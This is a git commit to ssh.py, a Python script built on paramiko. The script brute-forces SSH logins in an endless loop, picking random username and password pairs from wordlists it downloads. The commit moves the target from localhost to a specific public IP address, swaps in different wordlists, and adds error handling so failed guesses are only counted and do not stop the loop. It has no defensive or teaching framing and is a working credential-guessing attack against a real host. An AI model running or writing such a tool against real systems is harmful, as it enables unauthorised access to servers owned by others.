8aa1fccb2ef5fd6aa354888b79e9f8f05641019d
Nexity <46597698+Nexity@users.noreply.github.com>
2021-03-22 08:32:27 +0800

    better

--- ssh.py
+++ ssh.py
@@ -2,19 +2,23 @@ import paramiko
 import random
 import requests
 
-host = "127.0.0.1"
+host = "95.216.66.105"
 port = 22
-usernames = requests.get("https://github.com/jeanphorn/wordlist/raw/master/usernames.txt")
-passwords = requests.get("https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
+usernames = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/usernames.txt")
+passwords = requests.get("https://raw.githubusercontent.com/o7-Fire/General/master/passwords.txt")
 
 command = "ls"
-
+attempts = 0
 while True:
     username = random.choice(usernames.text.split("\n"))
     password = random.choice(passwords.text.split("\n"))
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(host, port, username, password)
-    stdin, stdout, stderr = ssh.exec_command(command)
-    lines = stdout.readlines()
-    print(lines)
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(host, port, username, password)
+        stdin, stdout, stderr = ssh.exec_command(command)
+        lines = stdout.readlines()
+        print(lines)
+    except:
+        attempts = attempts + 1
+        print("attempts: " + str(attempts))
